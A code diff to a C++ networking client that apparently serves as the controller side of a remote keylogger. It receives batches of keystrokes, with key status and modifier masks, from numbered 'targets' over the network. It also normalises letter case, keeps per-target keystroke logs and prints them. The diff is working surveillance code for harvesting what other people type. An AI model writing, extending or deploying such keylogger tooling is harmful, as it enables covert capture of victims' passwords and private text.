@@ -28,6 +28,30 @@ void client::print_storage() {
 
 void client::run() { networkingThread.join(); }
 
+bool client::isInterestingChar(char c) {
+    static std::string interestingChars =
+        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890[];',./"
+        "\\`-=~!@#$%^&*()_+{}|:\"<>? ";
+    return interestingChars.find(c) != std::string::npos;
+}
+
+void client::process_keys(uint32_t targetID, char character, keyStatus status,
+                          uint16_t modifierKeysBitMask) {
+    if (keyMap.find(targetID) == keyMap.end()) {
+        keyMap[targetID] = std::vector<char>();
+    }
+    if (status == keyStatus::keyUp)
+        return;
+    if (!isInterestingChar(character))
+        return;
+    if (!(modifierKeysBitMask & 4)) {
+        auto diff = 'a' - 'A';
+        if (std::isupper(character))
+            character += diff;
+    }
+    keyMap[targetID].push_back(character);
+}
+
 void client::networkInitAndLoop() {
     std::cout << std::format("Connecting to server...\n");
     if (!Connect(server_ip, server_port)) {
@@ -40,6 +64,8 @@ void client::networkInitAndLoop() {
     std::cout << std::format("Successfuly connected to server!\n");
     kq::message<messageType> msg(messageType::clientConnected);
     Send(msg);
+
+    std::vector<LogEntry> log;
     while (networkLoop) {
         if (!Incoming().empty()) {
             auto msg = Incoming().pop_front().msg;
@@ -47,19 +73,26 @@ void client::networkInitAndLoop() {
             case messageType::targetTyped:
                 uint32_t targetID;
                 msg >> targetID;
-                bool caps;
-                msg >> caps;
-                keyStatus status;
-                msg >> status;
-                DWORD virtualKey;
-                msg >> virtualKey;
-                if (status == keyStatus::keyDown) {
-                    auto diff = 0;
-                    if (std::isalpha(virtualKey) && caps) {
-                        diff = 32;
-                    }
-                    keyMap[targetID].push_back(virtualKey + diff);
+                uint32_t keys_count;
+                msg >> keys_count;
+                log.clear();
+                log.reserve(keys_count);
+                for (uint32_t i = 0; i < keys_count; i++) {
+                    uint16_t modifierKeysBitMask;
+                    msg >> modifierKeysBitMask;
+                    keyStatus status;
+                    msg >> status;
+                    char character;
+                    msg >> character;
+
+                    log.insert(log.begin(), LogEntry(character, status,
+                                                     modifierKeysBitMask));
                 }
+                for (auto& entry : log) {
+                    process_keys(targetID, entry.character, entry.status,
+                                 entry.modifierKeysBitMask);
+                }
+
                 print_storage();
                 break;
             case messageType::listOfTargets:
